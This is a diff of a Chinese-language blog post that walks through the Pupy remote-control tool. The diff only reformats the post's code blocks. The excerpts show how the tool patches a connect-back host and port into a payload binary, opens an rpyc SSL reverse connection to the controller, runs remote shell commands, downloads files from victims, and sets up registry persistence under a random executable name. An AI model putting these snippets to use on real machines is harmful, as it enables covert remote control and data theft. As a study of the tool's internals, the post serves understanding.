@@ -26,11 +26,13 @@
 
 <p>host为回连主机地址，-p指定回连端口，-t指定生成文件类型，-o指定生成文件名,然后生成对应二进制文件</p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">i</span><span class="o">=</span><span class="n">binary</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">&quot;&lt;default_connect_back_host&gt;:&lt;default_connect_back_port&gt;</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>
-<span class="o">...</span>
-<span class="n">new_host</span><span class="o">=</span><span class="s">&quot;</span><span class="si">%s</span><span class="s">:</span><span class="si">%s</span><span class="se">\x00\x00\x00\x00</span><span class="s">&quot;</span><span class="o">%</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">ip</span><span class="p">)</span>
-<span class="o">...</span>
-<span class="n">binary</span><span class="o">=</span><span class="n">binary</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="n">offsets</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span><span class="o">+</span><span class="n">new_host</span><span class="o">+</span><span class="n">binary</span><span class="p">[</span><span class="n">offsets</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">+</span><span class="nb">len</span><span class="p">(</span><span class="n">new_host</span><span class="p">):]</span></code></pre></div>
+<div>
+  <pre><code class="python">i=binary.find(&quot;&lt;default_connect_back_host&gt;:&lt;default_connect_back_port&gt;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;, i+1)
+...
+new_host=&quot;%s:%s\x00\x00\x00\x00&quot;%(host,ip)
+...
+binary=binary[0:offsets[0]]+new_host+binary[offsets[0]+len(new_host):]</code></pre>
+</div>
 
 <p>找到二进制文件中对应的标志位，再将host及ip写入</p>
 
@@ -42,15 +44,17 @@
 
 <p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/3.png" alt="" /></p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">rhost</span><span class="p">,</span><span class="n">rport</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span><span class="bp">None</span>
-        <span class="n">tab</span><span class="o">=</span><span class="n">HOST</span><span class="o">.</span><span class="n">rsplit</span><span class="p">(</span><span class="s">&quot;:&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
-        <span class="n">rhost</span><span class="o">=</span><span class="n">tab</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
-        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">tab</span><span class="p">)</span><span class="o">==</span><span class="mi">2</span><span class="p">:</span>
-            <span class="n">rport</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">tab</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
-        <span class="k">else</span><span class="p">:</span>
-            <span class="n">rport</span><span class="o">=</span><span class="mi">443</span>
-        <span class="k">print</span> <span class="s">&quot;connecting to </span><span class="si">%s</span><span class="s">:</span><span class="si">%s</span><span class="s">&quot;</span><span class="o">%</span><span class="p">(</span><span class="n">rhost</span><span class="p">,</span><span class="n">rport</span><span class="p">)</span>
-        <span class="n">conn</span><span class="o">=</span><span class="n">rpyc</span><span class="o">.</span><span class="n">ssl_connect</span><span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">service</span> <span class="o">=</span> <span class="n">ReverseSlaveService</span><span class="p">)</span></code></pre></div>
+<div>
+  <pre><code class="python">rhost,rport=None,None
+        tab=HOST.rsplit(&quot;:&quot;,1)
+        rhost=tab[0]
+        if len(tab)==2:
+            rport=int(tab[1])
+        else:
+            rport=443
+        print &quot;connecting to %s:%s&quot;%(rhost,rport)
+        conn=rpyc.ssl_connect(rhost, rport, service = ReverseSlaveService)</code></pre>
+</div>
 
 <p>默认是443端口并以冒号分割，再使用rpyc模块进行ssl连接到控制端，循环等待并打印出连接信息</p>
 
@@ -64,14 +68,16 @@
 
 <p>在pupysh.py中主要是导入pupylib.PupyServer和pupylib.PupyCmd，分别实例化，并使用PupyCmd继承cmd.Cmd中的cmdloop()方法，来解析并执行命令</p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">...</span>
-<span class="n">pupyServer</span><span class="o">=</span><span class="n">pupylib</span><span class="o">.</span><span class="n">PupyServer</span><span class="o">.</span><span class="n">PupyServer</span><span class="p">()</span>
-<span class="o">...</span>
-<span class="n">pupyServer</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
-    <span class="n">pcmd</span><span class="o">=</span><span class="n">pupylib</span><span class="o">.</span><span class="n">PupyCmd</span><span class="o">.</span><span class="n">PupyCmd</span><span class="p">(</span><span class="n">pupyServer</span><span class="p">)</span>
-    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-        <span class="k">try</span><span class="p">:</span>
-            <span class="n">pcmd</span><span class="o">.</span><span class="n">cmdloop</span><span class="p">()</span></code></pre></div>
+<div>
+  <pre><code class="python">...
+pupyServer=pupylib.PupyServer.PupyServer()
+...
+pupyServer.start()
+    pcmd=pupylib.PupyCmd.PupyCmd(pupyServer)
+    while True:
+        try:
+            pcmd.cmdloop()</code></pre>
+</div>
 
 <p>有趣的是在有中文版xp的受控端进入后，使用clients或sessions命令时均会出现如下错误</p>
 
@@ -79,15 +85,19 @@
 
 <p>看是解码错误，便在pupylib/PupyCmd.py中在导入模块后再添加以下代码就okay啦</p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">getdefaultencoding</span><span class="p">()</span><span class="o">!=</span><span class="s">&#39;gbk&#39;</span><span class="p">:</span>
-  <span class="nb">reload</span><span class="p">(</span><span class="n">sys</span><span class="p">)</span>
-  <span class="n">sys</span><span class="o">.</span><span class="n">setdefaultencoding</span><span class="p">(</span><span class="s">&#39;gbk&#39;</span><span class="p">)</span></code></pre></div>
+<div>
+  <pre><code class="python">if sys.getdefaultencoding()!='gbk':
+  reload(sys)
+  sys.setdefaultencoding('gbk')</code></pre>
+</div>
 
 <h2 id="clients">clients</h2>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">do_clients</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
-        <span class="sd">&quot;&quot;&quot; alias for sessions &quot;&quot;&quot;</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">do_sessions</span><span class="p">(</span><span class="n">arg</span><span class="p">)</span></code></pre></div>
+<div>
+  <pre><code class="python">def do_clients(self, arg):
+        &quot;&quot;&quot; alias for sessions &quot;&quot;&quot;
+        self.do_sessions(arg)</code></pre>
+</div>
 
 <p>可以看出来是和sessions的功能一样</p>
 
@@ -101,9 +111,11 @@
 
 <h2 id="exit">exit</h2>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">do_exit</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
-        <span class="sd">&quot;&quot;&quot; Quit Pupy Shell &quot;&quot;&quot;</span>
-        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span></code></pre></div>
+<div>
+  <pre><code class="python">def do_exit(self, arg):
+        &quot;&quot;&quot; Quit Pupy Shell &quot;&quot;&quot;
+        sys.exit()</code></pre>
+</div>
 
 <p>直接退出，没什么好说的</p>
 
@@ -123,16 +135,18 @@
 
 <p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/8.png" alt="" /></p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">do_read</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
-    <span class="sd">&quot;&quot;&quot; execute a list of commands from a file &quot;&quot;&quot;</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="k">if</span> <span class="ow">not</span> <span class="n">arg</span><span class="p">:</span>
-            <span class="bp">self</span><span class="o">.</span><span class="n">display_error</span><span class="p">(</span><span class="s">&quot;usage: read &lt;filename&gt;&quot;</span><span class="p">)</span>
-            <span class="k">return</span>
-        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">arg</span><span class="p">,</span><span class="s">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-            <span class="bp">self</span><span class="o">.</span><span class="n">cmdqueue</span><span class="o">.</span><span class="n">extend</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">splitlines</span><span class="p">())</span>
-    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">display_error</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span></code></pre></div>
+<div>
+  <pre><code class="python">def do_read(self, arg):
+    &quot;&quot;&quot; execute a list of commands from a file &quot;&quot;&quot;
+    try:
+        if not arg:
+            self.display_error(&quot;usage: read &lt;filename&gt;&quot;)
+            return
+        with open(arg,'r') as f:
+            self.cmdqueue.extend(f.read().splitlines())
+    except Exception as e:
+        self.display_error(str(e))</code></pre>
+</div>
 
 <p>接受一个文件，并逐行执行命令</p>
 
@@ -144,19 +158,21 @@
 
 <h2 id="listmodules">list_modules</h2>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">PupyCmd</span><span class="o">.</span><span class="n">py</span><span class="p">:</span>
-<span class="k">def</span> <span class="nf">do_list_modules</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arg</span><span class="p">):</span>
-    <span class="sd">&quot;&quot;&quot; List available modules with a brief description &quot;&quot;&quot;</span>
-    <span class="k">for</span> <span class="n">m</span><span class="p">,</span><span class="n">d</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">pupsrv</span><span class="o">.</span><span class="n">list_modules</span><span class="p">():</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;{:&lt;20}   {}</span><span class="se">\n</span><span class="s">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">color</span><span class="p">(</span><span class="n">d</span><span class="p">,</span><span class="s">&#39;grey&#39;</span><span class="p">)))</span>
+<div>
+  <pre><code class="python">PupyCmd.py:
+def do_list_modules(self, arg):
+    &quot;&quot;&quot; List available modules with a brief description &quot;&quot;&quot;
+    for m,d in self.pupsrv.list_modules():
+        self.stdout.write(&quot;{:&lt;20}   {}\n&quot;.format(m, color(d,'grey')))
 
-<span class="n">PupyServer</span><span class="o">.</span><span class="n">py</span><span class="p">:</span>
-<span class="k">def</span> <span class="nf">list_modules</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-    <span class="n">l</span><span class="o">=</span><span class="p">[]</span>
-    <span class="k">for</span> <span class="n">loader</span><span class="p">,</span> <span class="n">module_name</span><span class="p">,</span> <span class="n">is_pkg</span> <span class="ow">in</span> <span class="n">pkgutil</span><span class="o">.</span><span class="n">iter_modules</span><span class="p">(</span><span class="n">modules</span><span class="o">.</span><span class="n">__path__</span><span class="p">):</span>
-        <span class="n">module</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">get_module</span><span class="p">(</span><span class="n">module_name</span><span class="p">)</span>
-        <span class="n">l</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">module_name</span><span class="p">,</span><span class="n">module</span><span class="o">.</span><span class="n">__doc__</span><span class="p">))</span>
-    <span class="k">return</span> <span class="n">l</span></code></pre></div>
+PupyServer.py:
+def list_modules(self):
+    l=[]
+    for loader, module_name, is_pkg in pkgutil.iter_modules(modules.__path__):
+        module=self.get_module(module_name)
+        l.append((module_name,module.__doc__))
+    return l</code></pre>
+</div>
 
 <p>将modules包中脚本所包含的modules都列举出来，并附加简要说明</p>
 
@@ -208,11 +224,13 @@
 
 <p>直接执行远程shell命令，Windows上的编码还是换成cp936</p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">shell_exec</span><span class="o">.</span><span class="n">py</span><span class="p">:</span>
-<span class="o">...</span>
-<span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">is_windows</span><span class="p">():</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">res</span><span class="o">=</span><span class="n">res</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;cp936&#39;</span><span class="p">)</span><span class="c">#437&#39;)</span></code></pre></div>
+<div>
+  <pre><code class="python">shell_exec.py:
+...
+if self.client.is_windows():
+    try:
+        res=res.decode('cp936')#437')</code></pre>
+</div>
 
 <p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/16.png" alt="" /></p>
 
@@ -234,11 +252,13 @@
 
 <p><img src="http://ojyzyrhpd.bkt.clouddn.com/20151008/12.png" alt="" /></p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">remote_file</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">conn</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s">&#39;os.path&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">expandvars</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">remote_file</span><span class="p">)</span>
-<span class="n">rep</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">&quot;data&quot;</span><span class="p">,</span><span class="s">&quot;downloads&quot;</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">short_name</span><span class="p">())</span>
-<span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">local_file</span><span class="p">:</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">rep</span><span class="p">)</span></code></pre></div>
+<div>
+  <pre><code class="python">remote_file=self.client.conn.modules['os.path'].expandvars(args.remote_file)
+rep=os.path.join(&quot;data&quot;,&quot;downloads&quot;,self.client.short_name())
+if not args.local_file:
+    try:
+        os.makedirs(rep)</code></pre>
+</div>
 
 <p>如果未指明本地路径，则存储在/data/downloads中</p>
 
@@ -326,9 +346,11 @@
 
 <h3 id="persistence">persistence</h3>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">persistence</span><span class="o">.</span><span class="n">py</span><span class="p">:</span>
-<span class="o">...</span> 
-<span class="n">remote_path</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">conn</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s">&#39;os.path&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">expandvars</span><span class="p">(</span><span class="s">&quot;%TEMP%</span><span class="se">\\</span><span class="s">{}.exe&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span><span class="mi">12</span><span class="p">))])))</span></code></pre></div>
+<div>
+  <pre><code class="python">persistence.py:
+... 
+remote_path=self.client.conn.modules['os.path'].expandvars(&quot;%TEMP%\\{}.exe&quot;.format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))</code></pre>
+</div>
 
 <p>权限维持，写入到注册表中（对应临时目录下的随机命令exe），并开机启动</p>
 
@@ -340,32 +362,36 @@
 
 <p>首先新建一个pupy/packages/windows/all/pupwinutils/msgbox.py ，再写一个你想导入受控端的类或函数</p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">ctypes</span>
-<span class="kn">import</span> <span class="nn">threading</span>    
+<div>
+  <pre><code class="python">import ctypes
+import threading    
 
-<span class="k">def</span> <span class="nf">MessageBox</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">title</span><span class="p">):</span>
-    <span class="n">t</span><span class="o">=</span><span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">ctypes</span><span class="o">.</span><span class="n">windll</span><span class="o">.</span><span class="n">user32</span><span class="o">.</span><span class="n">MessageBoxA</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">title</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
-    <span class="n">t</span><span class="o">.</span><span class="n">daemon</span><span class="o">=</span><span class="bp">True</span>
-    <span class="n">t</span><span class="o">.</span><span class="n">start</span><span class="p">()</span></code></pre></div>
+def MessageBox(text, title):
+    t=threading.Thread(target=ctypes.windll.user32.MessageBoxA, args=(None, text, title, 0))
+    t.daemon=True
+    t.start()</code></pre>
+</div>
 
 <p>然后再创建一个模块来导入我们包和调用我们的函数</p>
 
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">class</span> <span class="nc">MsgBoxPopup</span><span class="p">(</span><span class="n">PupyModule</span><span class="p">):</span>
-    <span class="sd">&quot;&quot;&quot; Pop up a custom message box &quot;&quot;&quot;</span>    
+<div>
+  <pre><code class="python">class MsgBoxPopup(PupyModule):
+    &quot;&quot;&quot; Pop up a custom message box &quot;&quot;&quot;    
 
-    <span class="k">def</span> <span class="nf">init_argparse</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">arg_parser</span> <span class="o">=</span> <span class="n">PupyArgumentParser</span><span class="p">(</span><span class="n">prog</span><span class="o">=</span><span class="s">&quot;msgbox&quot;</span><span class="p">,</span> <span class="n">description</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">__doc__</span><span class="p">)</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">arg_parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">&#39;--title&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">&#39;msgbox title&#39;</span><span class="p">)</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">arg_parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">&#39;text&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">&#39;text to print in the msgbox :)&#39;</span><span class="p">)</span>    
+    def init_argparse(self):
+        self.arg_parser = PupyArgumentParser(prog=&quot;msgbox&quot;, description=self.__doc__)
+        self.arg_parser.add_argument('--title', help='msgbox title')
+        self.arg_parser.add_argument('text', help='text to print in the msgbox :)')    
 
-    <span class="nd">@windows_only</span>
-    <span class="k">def</span> <span class="nf">is_compatible</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-        <span class="k">pass</span>    
+    @windows_only
+    def is_compatible(self):
+        pass    
 
-    <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">load_package</span><span class="p">(</span><span class="s">&quot;pupwinutils.msgbox&quot;</span><span class="p">)</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">conn</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s">&#39;pupwinutils.msgbox&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">MessageBox</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">title</span><span class="p">)</span>
-        <span class="bp">self</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="s">&quot;message box popped !&quot;</span><span class="p">)</span></code></pre></div>
+    def run(self, args):
+        self.client.load_package(&quot;pupwinutils.msgbox&quot;)
+        self.client.conn.modules['pupwinutils.msgbox'].MessageBox(args.text, args.title)
+        self.log(&quot;message box popped !&quot;)</code></pre>
+</div>
 
 <p>title指定标题，再接内容</p>
 
